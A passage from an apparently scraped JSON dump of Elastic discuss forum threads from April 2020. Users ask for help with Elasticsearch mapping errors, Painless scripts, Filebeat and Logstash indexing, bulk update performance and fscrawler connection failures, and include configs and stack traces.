    "body": "Below is the reslut of Elastic query with derivative aggregation \"utils_per_5m\": { \"buckets\": [ { \"key_as_string\": \"2020-04-15T21:10:00.000Z\", \"doc_count\": 1, \"utils\": { \"value\": 924 }, \"key\": 1586985000000 }, { \"key_as_string\": \"2020-04-15T21:15:00.000Z\", \"doc_count\": 1, \"utils\": { \"value\": 0 }, \"utils_deriv\": { \"value\": -924 }, \"key\": 1586985300000 } ] } utils_per_5m.buckets array has two objects. Since using derivative, only the second object in the array will have util_deriv . Usecase : filter utils_per_5m.buckets array (2 objects ) with the condition as utils_per_5m.buckets.stream().filter(poll -> poll.utils_deriv.value != null && poll.utils_deriv.value < 0).collect(Collectors.toList()) while executing the script in painless, getting NPE, though null check in pace for poll.utils_deriv.value NULL prior to poll.utils_deriv.value < 0 . But , poll.utils.value == 0 filter working , utils.value exists in both the utils_per_5m.buckets array objects. utils_per_5m.buckets.stream().filter(poll -> poll.utils.value == 0).collect(Collectors.toList()) Can you clarify why poll.utils_deriv.value filter throwing NPE even after checking NULL , also second object in the array has matching data.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7dfc3005-5886-453e-b95a-50a878819f28",
    "url": "https://discuss.elastic.co/t/how-to-do-settting-is-write-index-true-for-alias-in-curator-action/228464",
    "title": "How to do settting \"is_write_index\": true for alias in curator action",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 17, 2020, 9:07am April 17, 2020, 6:20pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "aeea13f1-8566-4826-b684-ec909bdd6d35",
    "url": "https://discuss.elastic.co/t/spring-data-elasticsearch-with-es-7-2-1-geopoint-mapping-failure-while-indexing/227989",
    "title": "Spring Data Elasticsearch with ES 7.2.1 | GeoPoint mapping failure while indexing",
    "category": [
      "Elasticsearch"
    ],
    "author": "adivardhan",
    "date": "April 15, 2020, 6:40am April 15, 2020, 4:59am April 15, 2020, 6:38am April 15, 2020, 8:33am April 15, 2020, 8:34am April 16, 2020, 5:56am April 16, 2020, 7:02am April 16, 2020, 8:56am April 16, 2020, 9:02am April 17, 2020, 5:23pm",
    "body": "Hi, I am using ES 7.2.1 to store large amount of location based data and querying for near-by locations. For location coordinates, I am using GeoPoint fields from my java codebase. ES: 7.2.1 Spring Data Elasticsearch: 4.0.0.DATAES-690-SNAPSHOT org.elasticsearch: 7.2.1 Template: curl -X PUT \"localhost:9200/_template/store_locator_template?pretty\" -H 'Content-Type: application/json' -d' { \"order\": 1, \"index_patterns\": [ \"store_locator_*\" ], \"settings\": { }, \"mappings\": { \"properties\": { \"esId\": { \"type\": \"keyword\" }, \"geoPoint\": { \"type\": \"geo_point\" }, \"storeName\": { \"type\": \"keyword\" } } } } Entity class: @Getter @Setter @ToString @EqualsAndHashCode(of = \"esId\", callSuper = false) @NoArgsConstructor @Document(indexName = \"store_locator_index\", replicas = 0, createIndex = false) public class EsEntity { @Id @Field(type = FieldType.Text) private String esId; @GeoPointField private GeoPoint geoPoint; @Field(type = FieldType.Text) private String storeName; } And the code to PUT mapping from Spring: //clazz -> entity class with @Document annotation boolean indexCreated = false; if (!elasticsearchOperations.indexExists(clazz)) { indexCreated = elasticsearchOperations.createIndex(clazz); } if (indexCreated) { elasticsearchOperations.refresh(clazz); elasticsearchOperations.putMapping(clazz); --> Does the MAGIC } When trying to insert data via bulkIndex(), I am getting this error: org.springframework.data.elasticsearch.ElasticsearchException: Bulk indexing has failures. Use ElasticsearchException.getFailedDocuments() for detailed messages [{QObQeXEBqxAg6uMFyeNZ=ElasticsearchException[Elasticsearch exception [type=illegal_argument_exception, reason=**mapper [geoPoint] of different type, current_type [geo_point], merged_type [ObjectMapper]]]**}] Also....... Everything seems to be working for: ES 6.4.3 Spring Data Elasticsearch 3.1.X I am able to put mapping (via template) and insert document with GeoPoint. The index is generated automatically when doc is inserted via code. Here's my template: curl -X PUT \"localhost:9200/_template/store_locator_template?pretty\" -H 'Content-Type: application/json' -d' { \"order\": 1, \"index_patterns\": [ \"store_locator_*\" ], \"settings\": { }, \"mappings\": { \"store_locator_index\": { \"properties\": { \"esId\": { \"type\": \"keyword\" }, \"geoPoint\": { \"type\": \"geo_point\" }, \"storeName\": { \"type\": \"keyword\" } } } } } Here's the mapping: { \"mapping\": { \"properties\": { \"esId\": { \"type\": \"keyword\" }, \"geoPoint\": { \"type\": \"geo_point\" } } } }",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "c604b458-08b6-4a24-9a10-8558770037a8",
    "url": "https://discuss.elastic.co/t/how-to-save-multiple-logs-to-separate-es-indexs/227685",
    "title": "How to save multiple logs to separate ES index's",
    "category": [
      "Elasticsearch"
    ],
    "author": "VSP",
    "date": "April 12, 2020, 3:49pm April 12, 2020, 4:42pm April 17, 2020, 4:30pm",
    "body": "Hello, I am trying to send various types of logs through Filebeat -> Logstash -> Elastich Search -> Kibana I used Fields with a variable log_type and assigned different value to the variable basing on the type of the log and sending it to Logstash. In the output section of the logstash which is sending the data to ES, i am unable to use those fields set in Filebeat to create a index with the name. Can someone show a sample of how this can be done please. Code: Filebeat.yml: #=========================== Filebeat inputs ============================= filebeat.inputs: type: log paths: /var/log/httpd/dev-api-access_log fields: log_type: api_access_log fields_under_root: true type: log paths: /var/www/sites/api/log/debug-*.log fields: log_type: debug_log Logstash: input{ beats{ port => \"5044\" } } #filter{ grok { match => [\"message\", \"%{TIMESTAMP_ISO8601:timestamp}\"] } date { match => [\"timestamp\", \"ISO8601\"] } } output{ elasticsearch { hosts => [\"xxxx\"] index => \"%{[@metadata][fields]}-%{[@metadata][log_type]}\" -> HOW TO REFER THE FIELDS FROM FILEBEAT TO CREATE SEPARATE INDEX? } }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9ac69864-5121-4e81-af13-ed664ed8f469",
    "url": "https://discuss.elastic.co/t/es-marking-some-fields-as-multi-field-by-default-why/228239",
    "title": "ES marking some fields as multi-field by default. Why?",
    "category": [
      "Elasticsearch"
    ],
    "author": "deepak643",
    "date": "April 16, 2020, 5:35am April 17, 2020, 3:42pm",
    "body": "I have a document with few fields. For some of the fields in that document, my ES mappings defined those fields as \"keyword\". I have indexed one document and tried to retrieve the index mappings to see how ES is storing the rest of the fields. I have seen, some of the other fields which I dint define as \"keyword\" are also marked as \"keyword\". I dont understand why. Examples: Field marked as keyword by ES \"XXX\": { \"type\": \"keyword\" } Field \"YYY\" marked as \"text\" and also mentioned type \"keyword\" in document as below. Why does ES stores this way for this field? What is the reason behind storing YYY as multi-field. How to avoid it from storing it as multi-field. \"YYY\": { \"type\": \"text\", \"fields\": { \"keyword\": { \"type\": \"keyword\", \"ignore_above\": 256 } } } I am looking forward to understand what are the reasons behind ES storing this way. Please help me understand.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "03f6eeae-6023-466a-b606-2d17380eaae4",
    "url": "https://discuss.elastic.co/t/big-delay-in-writing-to-elasticsearch-from-some-log-inputs-of-filebeat/228007",
    "title": "Big delay in writing to Elasticsearch from some log inputs of Filebeat",
    "category": [
      "Elasticsearch"
    ],
    "author": "r2r2",
    "date": "April 14, 2020, 11:14pm April 14, 2020, 11:23pm April 15, 2020, 11:41pm April 21, 2020, 9:10pm April 21, 2020, 9:10pm",
    "body": "Hello! I had to migrate my Elasticsearch 7.0.1 in a docker container from ssd to hdd. After that I can see some filebeat log inputs are very late. I use filebeat to send Nginx logs using a log file input for multiple files and use my custom pipeline for parsing them. Data from access log files with little write load appears in Elasticsearch very fast. But data from busy log files (from the same filebeat and the same server) is late for 4-6 hours. How does the concurency work in this case? I don't know which parameters I need to tune. Is it possible to solve this problem by simply increasing count of workers? Best regards, Artur",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "4c6cad6b-09e8-4562-b526-55464ff77455",
    "url": "https://discuss.elastic.co/t/push-data-to-elasticsearch-through-api/225871",
    "title": "Push data to Elasticsearch through API",
    "category": [
      "Elasticsearch"
    ],
    "author": "Gauti",
    "date": "April 17, 2020, 3:24pm",
    "body": "Hi All, We are using elasticsearch for dashboard and reporting and analytics purpose, as part of this we are planning to get data from monitoring tool into elasticsearch, wanted to know is there a way that the monitoring tool can push the data directly into elasticsearch. The monitoring tool has the capability to push the data, but from elasticsearch side what i need to do to get that data. Thanks Gautham",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "718ca780-e606-4843-a0be-4a855a0e9f98",
    "url": "https://discuss.elastic.co/t/how-to-carry-forward-the-applied-index-level-settings-to-new-indices/228534",
    "title": "How to carry forward the applied index level settings to new indices",
    "category": [
      "Elasticsearch"
    ],
    "author": "ntsh999",
    "date": "April 17, 2020, 2:09pm April 17, 2020, 4:15pm April 17, 2020, 2:14pm",
    "body": "I am running elastic stack (ES, kibana, Filebeat, Metricbeat , logstash) v7.2 on kubernetes. I have applied the following setting to my filebeat and metricbeat index patterns. PUT metricbeat-*/_settings { \"index\" : { \"merge.scheduler.max_thread_count\" : 1 } } But this setting is not getting carried forward to the newly created indices. The indices created upto the date on which I had applied this setting from Kibana dev tools have this setting, but the indices created after this date does not have this setting. How to make this setting persistent for all the indices that will be created in future?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "46c5b46f-3f44-459d-8ade-8f62ca978f07",
    "url": "https://discuss.elastic.co/t/geo-point-mapping-python-and-streamsets-fails-with-elasticsearch/228486",
    "title": "Geo_point mapping python and Streamsets fails with Elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "drules",
    "date": "April 17, 2020, 12:50pm April 17, 2020, 2:07pm",
    "body": "I have this mapping in elasticsearch \"mappings\": { \"properties\": { \"fromCoordinates\": {\"type\": \"geo_point\"}, \"toCoordinates\": {\"type\": \"geo_point\"}, \"seenCoordinates\": {\"type\": \"geo_point\"}, } } With the kibana's console, there is no problem with all possible combinations of geo_ip fields supported by elasticsearch, i.e: (lat, lon) PUT /anindex/_doc/1 { \"fromCoordinates\": { \"lat\": 36.857200622558594 \"lon\": 117.21600341796875, }, \"toCoordinates\": { \"lat\": 22.639299392700195 \"lon\": 113.81099700927734, }, \"seenCoordinates\": { \"lat\": 36.91663 \"lon\": 117.216, } } (lon,lat) PUT /anindex/_doc/2 { \"fromCoordinates\": [36.857200622558594, 117.21600341796875], \"toCoordinates\": [22.639299392700195, 113.81099700927734], \"seenCoordinates\": [36.91663, 117.216] } But a I tried inserting, into elasticsearch, the data through python, and I always have this error: RequestError(400, 'illegal_argument_exception', 'mapper [fromCoordinates] of different type, current_type [geo_point], merged_type [ObjectMapper]') In python, I construct the json from a dictionary, and this is the result when I printed: fromCoordinates = {} fromCoordinates['lat'] = fromLat fromCoordinates['lon'] = fromLon dataDictionary.update({'fromCoordinates': fromCoordinates , 'toCoordinates': toCoordinates, 'seenCoordinates': seenCoordinates}) print(json.dumps(dataDictionary).encode('utf-8')) {\"fromCoordinates\": {\"lat\": 43.9962005615, \"lon\": 125.684997559}, \"toCoordinates\": {\"lat\": 40.080101013183594, \"lon\": 116.58499908447266}, \"seenCoordinates\": {\"lat\": 33.62672, \"lon\": 109.37243}} and load with this data = json.dumps(dataDictionary).encode('utf-8') es.create(index='anindex', doc_type='document', id=0, body=data) The array version has the same problems: fromCoordinates = [fromLon, fromLat] This is the json created and printed in python: {\"fromCoordinates\": [113.81099700927734, 22.639299392700195], \"toCoordinates\": [106.8010025024414, 26.53849983215332], \"seenCoordinates\": [107.46743, 26.34169]} In this case I have this response RequestError: RequestError(400, 'mapper_parsing_exception', 'geo_point expected') The same error occurs if I try with StreamSets to elasticsearch, having the both types of json shown before: mapper [fromCoordinates] of different type, current_type [geo_point], merged_type [ObjectMapper] This is the mapping loaded in elastic: GET /anindex/_mapping { \"anindex\" : { \"mappings\" : { \"properties\" : { \"fromCoordinates\" : { \"type\" : \"geo_point\" }, \"toCoordinates\" : { \"type\" : \"geo_point\" }, \"seenCoordinates\" : { \"type\" : \"geo_point\" } } } } } Any ideas? UPDATE: With curl, postman, kibana's console there is no problem with that. It clearly seems that the JSON nested fields are treated as an object and not \"pure\" json (plain) when I send them from python or from StreamsSets. I also tested with python and StreamSets without nested fields, and everything is ok. I also tried, without creating the mapping first and leaving elastic to guess and create by itself, and elastic mapped the coordinates as numbers or strings. I also tried building the json \"by hand\" and send it, and get the same error.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4fee200a-4a93-44ac-934e-15583af2e585",
    "url": "https://discuss.elastic.co/t/bulk-inserts-taking-a-long-time/228530",
    "title": "Bulk Inserts taking a long time",
    "category": [
      "Elasticsearch"
    ],
    "author": "jcremeans",
    "date": "April 17, 2020, 2:01pm April 17, 2020, 2:01pm April 17, 2020, 2:00pm April 17, 2020, 2:08pm",
    "body": "I am having an issue with bulk updating records. As I send requests, the bulk update takes longer and longer to work. I am using the scroll api in batches of 100 then bulk updating them. Some of these operations will take between 25-45 secs to work. When I lower it to 10 per bulk update, the times are better but still very slow, around 5-15 secs. When this is running, I notice light load on the nodes. We are self hosted and on version 7.4.2. We have a 9 node cluster (3 master, 6 data). Below is an example of the body that I'm trying to update. ( [body] => Array ( [0] => Array ( [update] => Array ( [_index] => recordings [_id] => 023abe67-101f-412e-9b24-b6d5c5302179 ) ) [1] => Array ( [doc] => Array ( [billed_duration] => 180 [billed_amount] => 0.0325 ) ) ) ) Here are my index settings for reference { \"index.blocks.read_only_allow_delete\": \"false\", \"index.priority\": \"1\", \"index.query.default_field\": [ \"*\" ], \"index.write.wait_for_active_shards\": \"1\", \"index.refresh_interval\": \"1s\", \"index.max_result_window\": \"100000\", \"index.analysis.filter.filter_shingle.max_shingle_size\": \"5\", \"index.analysis.filter.filter_shingle.min_shingle_size\": \"2\", \"index.analysis.filter.filter_shingle.output_unigrams\": \"true\", \"index.analysis.filter.filter_shingle.type\": \"shingle\", \"index.analysis.analyzer.analyzer_shingle.filter\": [ \"lowercase\", \"filter_shingle\" ], \"index.analysis.analyzer.analyzer_shingle.tokenizer\": \"standard\", \"index.number_of_replicas\": \"1\", \"index.version.upgraded\": \"7040299\" } I'm starting to wonder if there is a setting or something that I am missing. I tried turning the refresh interval to -1 and that doesn't seem to help. Any Thoughts?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ac9b8e90-e5cf-4ffc-b3b6-f40676edc793",
    "url": "https://discuss.elastic.co/t/deleted-es-indices-coming-back/228213",
    "title": "Deleted ES indices coming back",
    "category": [
      "Elasticsearch"
    ],
    "author": "ntsh999",
    "date": "April 15, 2020, 10:05pm April 15, 2020, 10:07pm April 15, 2020, 10:08pm April 16, 2020, 3:05am April 16, 2020, 3:12am April 17, 2020, 1:44pm",
    "body": "I am running Elastic stack v7.2 in Azure Kubernetes for logging and monitoring of containerized applications. I have 3 master + 2 data node configuration. I am using ES curator which is scheduled to run once daily to delete the indices which are older than 4 days. Even though the ES Curator successfully deletes the older indices but they do came back. How is this happening? Please see the error logs below from the ES server {\"type\": \"server\", \"timestamp\": \"2020-04-15T21:41:16,415+0000\", \"level\": \"INFO\", \"component\": \"o.e.i.IndexingMemoryController\", \"cluster.name\": \"es-eic-logs\", \"node.name\": \"elasticsearch-data-0\", \"cluster.uuid\": \"dTg5I7svTnCy1_eOkXw7gw\", \"node.id\": \"EoTA9f6bSNGDTZQ5T3oQfw\", \"message\": \"now throttling indexing for shard [[filebeat-k8-7.2.0-2019.10.17][0]]: segment writing can't keep up\" } You see that the error message is for filebeat index which was supposed to be created on 17-Oct-2019 and it was supposed to be deleted by 21 Oct 2019. Even when I manually delete the indices they do come back after a short interval. Can some one help in understanding how these indices are coming up? I am not explicitly POSTing data to any of the back dated indices nor should the applications be doing it. Below is the response from cluster health API for my cluster { \"cluster_name\" : \"es-eic-logs\", \"status\" : \"green\", \"timed_out\" : false, \"number_of_nodes\" : 5, \"number_of_data_nodes\" : 2, \"active_primary_shards\" : 114, \"active_shards\" : 228, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 0, \"delayed_unassigned_shards\" : 0, \"number_of_pending_tasks\" : 0, \"number_of_in_flight_fetch\" : 0, \"task_max_waiting_in_queue_millis\" : 0, \"active_shards_percent_as_number\" : 100.0 }",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "6f426e3f-7f2f-4d31-a376-7a6604b5628e",
    "url": "https://discuss.elastic.co/t/painless-scrip-error-in-kibana/227526",
    "title": "Painless scrip error in kibana",
    "category": [
      "Elasticsearch"
    ],
    "author": "Ganesh2303",
    "date": "April 10, 2020, 3:25pm April 17, 2020, 12:44pm",
    "body": "HI Team, I'm working on scripted field to generate userid value in separate field and please find my error detail with script. Script: def m = /.*UserID/.matcher(doc['message.keyword'].value); if ( m.matches() ) { return m.group(1) } else { return \"no match\" } Message: message.keyword: 2020-03-12 12:25:21:692 Logger - Received JSON Response: UserID: 124345 Error: { \"root_cause\": [ { \"type\": \"script_exception\", \"reason\": \"runtime error\", \"script_stack\": [ \"org.elasticsearch.search.lookup.LeafDocLookup.get(LeafDocLookup.java:94)\", \"org.elasticsearch.search.lookup.LeafDocLookup.get(LeafDocLookup.java:41)\", \"m = /.*UserID/.matcher(doc['message.keyword'].value);\\r\\n\", \" ^---- HERE\" ], \"script\": \"def m = /.*UserID/.matcher(doc['message.keyword'].value);\\r\\nif ( m.matches() ) {\\r\\n return m.group(1)\\r\\n} else {\\r\\n return \\\"no match\\\"\\r\\n}\", \"lang\": \"painless\" } ], \"type\": \"search_phase_execution_exception\", \"reason\": \"all shards failed\", \"phase\": \"query\", \"grouped\": true, \"failed_shards\": [ { \"shard\": 0, \"index\": \"test\", \"node\": \"4QB1XVnuRzCkQ7KtGC4r9Q\", \"reason\": { \"type\": \"script_exception\", \"reason\": \"runtime error\", \"script_stack\": [ \"org.elasticsearch.search.lookup.LeafDocLookup.get(LeafDocLookup.java:94)\", \"org.elasticsearch.search.lookup.LeafDocLookup.get(LeafDocLookup.java:41)\", \"m = /.*UserID/.matcher(doc['message.keyword'].value);\\r\\n\", \" ^---- HERE\" ], \"script\": \"def m = /.*UserID/.matcher(doc['message.keyword'].value);\\r\\nif ( m.matches() ) {\\r\\n return m.group(1)\\r\\n} else {\\r\\n return \\\"no match\\\"\\r\\n}\", \"lang\": \"painless\", \"caused_by\": { \"type\": \"illegal_argument_exception\", \"reason\": \"No field found for [message.keyword] in mapping with types []\" } } } ] }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d24f0555-bde7-4ff0-920d-e22b5715b206",
    "url": "https://discuss.elastic.co/t/exact-search-getting-less-precedence-then-phonetic/228485",
    "title": "Exact search getting less precedence then phonetic?",
    "category": [
      "Elasticsearch"
    ],
    "author": "abhijith_chandran",
    "date": "April 17, 2020, 9:49am April 17, 2020, 10:31am April 17, 2020, 11:49am April 17, 2020, 12:13pm",
    "body": "I have an elasticsearch index and am using the following query: \"_source\": [ \"title\", \"content\" ], \"size\": 15, \"from\": 0, \"query\": { \"bool\": { \"must\": { \"multi_match\": { \"query\": \"{{query}}\", \"fields\": [ \"title\", \"content\" ], \"operator\": \"or\" } }, \"should\": [ { \"multi_match\": { \"query\": \"{{query}}\", \"fields\": [ \"title.standard^16\", \"content.standard^2\" ], \"operator\": \"and\" } }, { \"match_phrase\": { \"content.standard\": { \"query\": \"{{query}}\", \"_name\": \"Phrase on title\", \"boost\": 1000 } } } ] } }, \"highlight\": { \"fields\": { \"content\": {} }, \"fragment_size\": 100 } } Here is the mapping I set: { \"settings\": { \"index\": { \"analysis\": { \"analyzer\": { \"my_analyzer\": { \"tokenizer\": \"standard\", \"filter\": [ \"lowercase\", \"my_metaphone\" ] } }, \"filter\": { \"my_metaphone\": { \"type\": \"phonetic\", \"encoder\": \"metaphone\", \"replace\": true } } } } }, \"mappings\": { \"properties\": { \"title\": { \"type\": \"text\", \"term_vector\": \"with_positions_offsets\", \"analyzer\": \"my_analyzer\", \"fields\": { \"standard\": { \"type\": \"text\" }, \"stemmer\": { \"type\": \"text\", \"analyzer\": \"english\" } } }, \"content\": { \"type\": \"text\", \"term_vector\": \"with_positions_offsets\", \"analyzer\": \"my_analyzer\", \"fields\": { \"standard\": { \"type\": \"text\" }, \"stemmer\": { \"type\": \"text\", \"analyzer\": \"english\" } } } } } } Here is my logic with the query: It will give the highest precedence to a phrase if it appears. If not it will use the standard analyzer (that is the text, as is) and give it the highest precedence. If all else doesn't match up, it will use the phonetic analyzer to get the results, that is the least precedence. But obviously there is some fault to this as it seems to give higher precedence to the phonetic analyzer than the standard or phrase. For example, if I search for \"Person of Indian Origin\" it returns results on the top highlighting \"Pursuant\" \"pursuing\" and very, very less number of results with person of Indian origin although I know a large number of them exists. How do I solve this? Here is some sample data to test it out - https://pastebin.com/mzfwz0b3",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9df67405-47a4-4ca5-9adf-c3ecc9df1a07",
    "url": "https://discuss.elastic.co/t/errors-while-indexing-mounted-drive-using-fscrawler/228238",
    "title": "Errors while indexing mounted drive using fscrawler",
    "category": [
      "Elasticsearch"
    ],
    "author": "Lisahtwy",
    "date": "April 16, 2020, 3:36am April 16, 2020, 3:49am April 16, 2020, 4:02am April 16, 2020, 7:05am April 17, 2020, 12:12pm",
    "body": "Hi, I have mounted sharpeoint site to a network drive (/mnt/sp) in centos. Then I am indexing the mounted files using fscrawler. Here is my settings file: --- name: \"index_45.79.189.33\" fs: url: \"/mnt/sp/fsSharepointFiles\" update_rate: \"15m\" excludes: - \"*/~*\" json_support: false filename_as_id: false add_filesize: true remove_deleted: true add_as_inner_object: false store_source: false index_content: true attributes_support: false raw_metadata: false xml_support: false index_folders: true lang_detect: false continue_on_error: false ocr: language: \"eng\" enabled: true pdf_strategy: \"ocr_and_text\" follow_symlinks: false elasticsearch: nodes: - url: \"http://50.116.48.89:8881\" username: ls password: lspass bulk_size: 100 flush_interval: \"5s\" byte_size: \"10mb\" when I create my index directory and index for the first time everything is working fine. But when reindex using --restart below errors are coming. ``` [ls@li1288-33 fscrawler-es7-2.7-SNAPSHOT]$ bin/fscrawler --config_dir test_dir_45.79.189.33 index_45.79.189.33 --loop 1 --restart 03:03:47,737 INFO [f.p.e.c.f.c.BootstrapChecks] Memory [Free/Total=Percent]: HEAP [61.2mb/843mb=7.27%], RAM [1.8gb/3.7gb=49.26%], Swap [511.9mb/511.9mb=100.0%]. 03:03:49,000 INFO [f.p.e.c.f.c.v.ElasticsearchClientV7] Elasticsearch Client for version 7.x connected to a node running version 7.5.1 03:03:49,088 INFO [f.p.e.c.f.FsCrawlerImpl] Starting FS crawler 03:03:49,448 INFO [f.p.e.c.f.FsParserAbstract] FS crawler started for [index_45.79.189.33] for [/mnt/sp/fsSharepointFiles] every [15m] 03:04:39,529 WARN [f.p.e.c.f.FsParserAbstract] Error while crawling /mnt/sp/fsSharepointFiles: /mnt/sp/fsSharepointFiles/fsSharepointfile1.txt (Resource temporarily unavailable) 03:04:39,529 INFO [f.p.e.c.f.FsParserAbstract] FS crawler is stopping after 1 run 03:04:54,121 WARN [f.p.e.c.f.c.v.ElasticsearchClientV7] Got a hard failure when executing the bulk request java.net.SocketTimeoutException: 30,000 milliseconds timeout on connection http-outgoing-0 [ACTIVE] at org.apache.http.nio.protocol.HttpAsyncRequestExecutor.timeout(HttpAsyncRequestExecutor.java:387) [httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.client.InternalIODispatch.onTimeout(InternalIODispatch.java:92) [httpasyncclient-4.1.4.jar:4.1.4] at org.apache.http.impl.nio.client.InternalIODispatch.onTimeout(InternalIODispatch.java:39) [httpasyncclient-4.1.4.jar:4.1.4] at org.apache.http.impl.nio.reactor.AbstractIODispatch.timeout(AbstractIODispatch.java:175) [httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.reactor.BaseIOReactor.sessionTimedOut(BaseIOReactor.java:261) [httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.reactor.AbstractIOReactor.timeoutCheck(AbstractIOReactor.java:502) [httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.reactor.BaseIOReactor.validate(BaseIOReactor.java:211) [httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.reactor.AbstractIOReactor.execute(AbstractIOReactor.java:280) [httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.reactor.BaseIOReactor.execute(BaseIOReactor.java:104) [httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.reactor.AbstractMultiworkerIOReactor$Worker.run(AbstractMultiworkerIOReactor.java:591) [httpcore-nio-4.4.13.jar:4.4.13] at java.lang.Thread.run(Thread.java:748) [?:1.8.0_242] 03:04:54,134 INFO [f.p.e.c.f.FsCrawlerImpl] FS crawler [index_45.79.189.33] stopped 03:04:54,138 INFO [f.p.e.c.f.FsCrawlerImpl] FS crawler [index_45.79.189.33] stopped [ls@li1288-33 fscrawler-es7-2.7-SNAPSHOT]$ ^C [ls@li1288-33 fscrawler-es7-2.7-SNAPSHOT]$ bin/fscrawler --config_dir test_dir_45.79.189.33 index_45.79.189.33 --loop 1 --restart 03:11:35,231 INFO [f.p.e.c.f.c.BootstrapChecks] Memory [Free/Total=Percent]: HEAP [61.3mb/843mb=7.28%], RAM [1.8gb/3.7gb=49.24%], Swap [511.9mb/511.9mb=100.0%]. 03:11:37,200 WARN [f.p.e.c.f.c.v.ElasticsearchClientV7] failed to create elasticsearch client, disabling crawler... 03:11:37,200 FATAL [f.p.e.c.f.c.FsCrawlerCli] We can not start Elasticsearch Client. Exiting. java.net.ConnectException: Timeout connecting to [/50.116.48.89:8881] at org.elasticsearch.client.RestClient.extractAndWrapCause(RestClient.java:823) ~[elasticsearch-rest-client-7.6.2.jar:7.6.2] at org.elasticsearch.client.RestClient.performRequest(RestClient.java:248) ~[elasticsearch-rest-client-7.6.2.jar:7.6.2] at org.elasticsearch.client.RestClient.performRequest(RestClient.java:235) ~[elasticsearch-rest-client-7.6.2.jar:7.6.2] at org.elasticsearch.client.RestHighLevelClient.internalPerformRequest(RestHighLevelClient.java:1514) ~[elasticsearch-rest-high-level-client-7.6.2.jar:7.6.2] at org.elasticsearch.client.RestHighLevelClient.performRequest(RestHighLevelClient.java:1499) ~[elasticsearch-rest-high-level-client-7.6.2.jar:7.6.2] at org.elasticsearch.client.RestHighLevelClient.performRequestAndParseEntity(RestHighLevelClient.java:1466) ~[elasticsearch-rest-high-level-client-7.6.2.jar:7.6.2] at org.elasticsearch.client.RestHighLevelClient.info(RestHighLevelClient.java:730) ~[elasticsearch-rest-high-level-client-7.6.2.jar:7.6.2] at fr.pilato.elasticsearch.crawler.fs.client.v7.ElasticsearchClientV7.getVersion(ElasticsearchClientV7.java:169) ~[fscrawler-elasticsearch-client-v7-2.7-SNAPSHOT.jar:?] at fr.pilato.elasticsearch.crawler.fs.client.ElasticsearchClient.checkVersion(ElasticsearchClient.java:181) ~[fscrawler-elasticsearch-client-base-2.7-SNAPSHOT.jar:?] at fr.pilato.elasticsearch.crawler.fs.client.v7.ElasticsearchClientV7.start(ElasticsearchClientV7.java:142) ~[fscrawler-elasticsearch-client-v7-2.7-SNAPSHOT.jar:?] at fr.pilato.elasticsearch.crawler.fs.cli.FsCrawlerCli.main(FsCrawlerCli.java:257) [fscrawler-cli-2.7-SNAPSHOT.jar:?] Caused by: java.net.ConnectException: Timeout connecting to [/50.116.48.89:8881] at org.apache.http.nio.pool.RouteSpecificPool.timeout(RouteSpecificPool.java:169) ~[httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.nio.pool.AbstractNIOConnPool.requestTimeout(AbstractNIOConnPool.java:632) ~[httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.nio.pool.AbstractNIOConnPool$InternalSessionRequestCallback.timeout(AbstractNIOConnPool.java:898) ~[httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.reactor.SessionRequestImpl.timeout(SessionRequestImpl.java:198) ~[httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.reactor.DefaultConnectingIOReactor.processTimeouts(DefaultConnectingIOReactor.java:213) ~[httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.reactor.DefaultConnectingIOReactor.processEvents(DefaultConnectingIOReactor.java:158) ~[httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.reactor.AbstractMultiworkerIOReactor.execute(AbstractMultiworkerIOReactor.java:351) ~[httpcore-nio-4.4.13.jar:4.4.13] at org.apache.http.impl.nio.conn.PoolingNHttpClientConnectionManager.execute(PoolingNHttpClientConnectionManager.java:221) ~[httpasyncclient-4.1.4.jar:4.1.4] at org.apache.http.impl.nio.client.CloseableHttpAsyncClientBase$1.run(CloseableHttpAsyncClientBase.java:64) ~[httpasyncclient-4.1.4.jar:4.1.4] at java.lang.Thread.run(Thread.java:748) ~[?:1.8.0_242] 03:11:37,215 INFO [f.p.e.c.f.FsCrawlerImpl] FS crawler [index_45.79.189.33] stopped 03:11:37,216 INFO [f.p.e.c.f.FsCrawlerImpl] FS crawler [index_45.79.189.33] stopped ``` Again if I delete the index directory and start the indexing, no errors are coming. [ls@li1288-33 fscrawler-es7-2.7-SNAPSHOT]$ rm -rf test_dir_45.79.189.33/ [ls@li1288-33 fscrawler-es7-2.7-SNAPSHOT]$ ls bin lib LICENSE NOTICE README.md test_dir_sp_linux [ls@li1288-33 fscrawler-es7-2.7-SNAPSHOT]$ bin/fscrawler --config_dir test_dir_45.79.189.33 index_45.79.189.33 --loop 1 03:25:16,631 INFO [f.p.e.c.f.c.BootstrapChecks] Memory [Free/Total=Percent]: HEAP [61.3mb/843mb=7.28%], RAM [1.8gb/3.7gb=49.21%], Swap [511.9mb/511.9mb=100.0%]. 